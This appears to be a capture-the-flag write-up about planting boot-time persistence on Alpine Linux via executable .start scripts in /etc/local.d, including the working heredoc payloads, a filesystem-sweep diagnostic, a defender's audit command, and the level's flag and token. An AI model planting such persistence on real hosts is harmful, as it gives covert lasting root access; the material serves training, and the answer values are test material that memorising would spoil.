# L12 — ps-persistence · Stay After the Reboot

**Act III · Persistence and Evasion · T1543.002**
**Status:** Solved
**Flag:** `bl_35467ed6dfbdf5164361c3c28990ef68`

---

## Challenge brief

> Access you cannot keep is access you do not have. Install exactly one mechanism that
> brings you back after the host restarts. You are graded on it firing again, not on
> creating a file. The check restarts the host by replaying its rc-local startup, so
> that is the surface to land in.

MITRE tag T1543.002 is "Create or Modify System Process: RC Scripts" — using the
system's boot-time script execution mechanism to plant code that runs automatically on
every restart.

You land as root. The job is not to find a secret — it is to plant a persistence
mechanism that fires when the box restarts, and to have that mechanism read a
grader-supplied value and write it to the proof file.

---

## How the grader works

Understanding the grader is essential to solving this level. Previous levels had a
static secret on disk that you found and wrote to the proof file. This level is
different — the proof value is not pre-placed for you to discover. Instead:

1. The grader plants a unique per-session token at `/opt/.persist-target` before the
   simulated restart.
2. The grader calls `/usr/local/bin/boot.sh` to simulate the restart.
3. `boot.sh` runs every executable `.start` script in `/etc/local.d/`.
4. After `boot.sh` finishes, the grader reads `/tmp/.ps-persist-proof` and compares
   it to the token it planted at `/opt/.persist-target`.
5. If they match, the level is solved.

This design tests whether you planted a real persistence mechanism — not whether you
found a static answer. Your script must be in `/etc/local.d/`, must be executable, and
must read `/opt/.persist-target` and write its contents to `/tmp/.ps-persist-proof`
when called.

Reading `boot.sh` reveals the exact mechanism:

```sh
cat /usr/local/bin/boot.sh
```

```sh
#!/bin/sh
# System-startup harness. Replays every executable rc-local service, exactly as an
# init would on boot. The grader re-runs this to simulate a restart and check that a
# player's persistence mechanism re-fires. Spiked 2026-09-07: survival-graded.
for s in /etc/local.d/*.start; do [ -x "$s" ] && "$s"; done
```

Three conditions your script must satisfy:
- Located in `/etc/local.d/`
- Named with a `.start` extension
- Executable (`chmod +x`)

---

## Alpine Linux boot persistence — how it differs from Ubuntu

The topic note was written for Ubuntu with systemd. Alpine uses OpenRC, which works
differently.

### Ubuntu/systemd approach

On Ubuntu, rc.local is a compatibility shim handled by `rc-local.service`. The file
`/etc/rc.local` is executed by systemd during boot. Systemd manages service ordering,
dependencies, and parallelism.

### Alpine/OpenRC approach

Alpine uses OpenRC as its init system. OpenRC does not use `/etc/rc.local` directly.
Instead it uses `/etc/local.d/` — a directory of shell scripts:

- Files ending in `.start` are executed at the end of the boot sequence (equivalent to
  rc.local on Ubuntu)
- Files ending in `.stop` are executed at shutdown
- Only files that are executable are run — the `[ -x "$s" ]` check in `boot.sh` mirrors
  what OpenRC does natively

The `local` OpenRC service is what reads and runs these scripts on a real Alpine boot.
In this challenge, `boot.sh` replays that behavior to simulate a restart.

### Key differences to remember

| Feature | Ubuntu (systemd) | Alpine (OpenRC) |
|---|---|---|
| Boot script file | `/etc/rc.local` | `/etc/local.d/*.start` |
| Init system | systemd | OpenRC |
| Service management | `systemctl enable/start` | `rc-update add / rc-service start` |
| Service unit files | `/etc/systemd/system/*.service` | `/etc/init.d/*` |
| Check if service enabled | `systemctl is-enabled <name>` | `rc-update show` |

---

## The grader's seed file — what we missed and how we found it

The most important part of this level was discovering where the grader plants its token.
We went through several wrong assumptions before finding it:

**Wrong assumption 1:** The grader checks a hardcoded value like the hostname or a fixed
string. We tried writing `"persistent"` and the hostname — both rejected with "wrong
value."

**Wrong assumption 2:** The seed file appears in `/run/` or `/tmp/` during the simulated
restart. We wrote a diagnostic payload that dumped `/run/` and `/tmp/` during execution
— both were empty at restart time.

**The breakthrough:** We wrote a payload that dumped every file on the entire filesystem
during the simulated restart. This output included:

```
/opt/.persist-target
```

This file was invisible in normal exploration because we had only checked `/run/`, `/tmp/`,
and `/etc/`. The grader plants its token in `/opt/.persist-target` — a non-obvious
location that requires a full filesystem sweep to discover.

The diagnostic payload that found it:

```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null > /tmp/.ps-debug2
env >> /tmp/.ps-debug2
EOF
chmod +x /etc/local.d/persist.start
verify
cat /tmp/.ps-debug2
```

This is the correct methodical approach when you don't know where a grader plants its
seed: run your payload as a diagnostic first, dump everything you can see, then read
the output to find what the grader placed.

---

## Initial hypothesis

Root shell, persistence challenge. The challenge explicitly says the surface is rc-local
startup. On Alpine that means `/etc/local.d/*.start` scripts.

The grader simulates a restart by running `boot.sh`, which in turn runs all `.start`
scripts in `/etc/local.d/`. The proof file `/tmp/.ps-persist-proof` must exist after
that with the correct value.

---

## Enumeration log

### Step 1 — Check the rc.local situation

```sh
cat /etc/rc.local 2>/dev/null
ls -la /etc/rc.local 2>/dev/null
ls -la /etc/local.d/
rc-status 2>/dev/null | grep local
```

Result: no `/etc/rc.local`, `/etc/local.d/` exists but is empty, `rc-status` shows
nothing for local. This is Alpine — the persistence surface is `/etc/local.d/`, not
`/etc/rc.local`.

---

### Step 2 — Run verify to understand what the grader expects

```sh
verify
```

```
Not solved yet. no proof after the simulated restart
Write the value you recover to /tmp/.ps-persist-proof, then run verify again.
```

Proof file: `/tmp/.ps-persist-proof`. The grader simulates a restart and then checks
this file.

---

### Step 3 — Read boot.sh to understand the mechanism

```sh
ls /usr/local/bin/
cat /usr/local/bin/boot.sh
```

Reveals the exact mechanism: runs every executable `*.start` file in `/etc/local.d/`.
This is the entry point.

---

### Step 4 — First payload attempt (hardcoded value)

```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
echo "persistent" > /tmp/.ps-persist-proof
EOF
chmod +x /etc/local.d/persist.start
verify
```

Result: "the value written on restart is wrong." The script ran but the value was wrong.
The grader wants a specific value, not a hardcoded string.

**Conclusion:** The grader plants a token somewhere. Find it.

---

### Step 5 — Wrong assumption: seed in /run/ or /tmp/

Wrote a diagnostic payload to dump `/run/` and `/tmp/` during the simulated restart.
Both were empty. Also tried known seed paths (`/run/ps-persist-seed`,
`/tmp/.ps-persist-seed`) — none existed.

Also tried the hostname as the value — rejected.

---

### Step 6 — Diagnostic payload: full filesystem dump

```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null > /tmp/.ps-debug2
env >> /tmp/.ps-debug2
EOF
chmod +x /etc/local.d/persist.start
verify
cat /tmp/.ps-debug2
```

In the output, among all the system files, one non-system file stood out:

```
/opt/.persist-target
```

This is the grader's seed file. It was in `/opt/` — a directory we had not checked
directly because it seemed unlikely for a per-run token.

---

### Step 7 — Read the seed and confirm

```sh
cat /opt/.persist-target
```

```
665b2fa28da95a0386b7bb221310d292
```

A 32-character hex string — the per-session token the grader planted.

---

### Step 8 — Final payload

```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
cat /opt/.persist-target > /tmp/.ps-persist-proof
EOF
chmod +x /etc/local.d/persist.start
verify
```

Result: "Level solved: ps-persistence."

---

## What the vulnerability demonstrates

This level simulates a real-world persistence plant. On a compromised box, an attacker
with root can place a script in `/etc/local.d/` that runs automatically on every reboot.
The script can do anything root can do: re-drop a SUID shell, write an SSH key, open a
reverse shell, re-plant other mechanisms that may have been cleaned.

The power of `/etc/local.d/` persistence:
- Survives reboots
- Survives password changes
- Runs as root without any user interaction
- On Alpine, requires root to plant (writing to `/etc/local.d/` is root-only)
- Hard to notice unless you specifically audit this directory

The defender's sweep for this:

```sh
ls -la /etc/local.d/
cat /etc/local.d/*.start 2>/dev/null
```

Any `.start` file not placed by the administrator is a finding.

---

## Dead ends

### Hardcoded value in the payload

Writing a fixed string ("persistent", the hostname) — both rejected. The grader
generates a unique per-session token. The payload must read the token, not guess it.

### Looking for the seed in /run/ and /tmp/

Natural places to look for transient files — but the grader placed the seed in `/opt/`,
which persists across the simulated restart. `/run/` and `/tmp/` are cleared or empty.

### Guessing the seed path

Tried `/run/ps-persist-seed`, `/tmp/.ps-persist-seed`, `/run/persist-seed` — none
existed. The correct approach was a full filesystem dump during execution, not guessing.

---

## Carryover findings

None. The level is self-contained.

---

## Command reference

| Command | What it does |
|---|---|
| `ls -la /etc/local.d/` | Check for existing boot scripts on Alpine |
| `cat /usr/local/bin/boot.sh` | Read the grader's restart simulation script |
| `cat > /etc/local.d/name.start << 'EOF' ... EOF` | Create a boot script (heredoc syntax) |
| `chmod +x /etc/local.d/name.start` | Make the script executable — required for boot.sh to run it |
| `cat /opt/.persist-target` | Read the grader's seed token |
| `cat /opt/.persist-target > /tmp/.ps-persist-proof` | Copy seed to proof file — what the final payload does |
| `find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null` | Full filesystem dump — used to discover the seed file location |
| `rc-status 2>/dev/null` | Show OpenRC service status on Alpine |
| `rc-update show` | Show which OpenRC services are enabled at which runlevel |
| `/usr/local/bin/boot.sh` | Manually run the simulated restart to test the payload |
| `printf 'VALUE' > /tmp/.ps-persist-proof && verify` | Write proof and verify |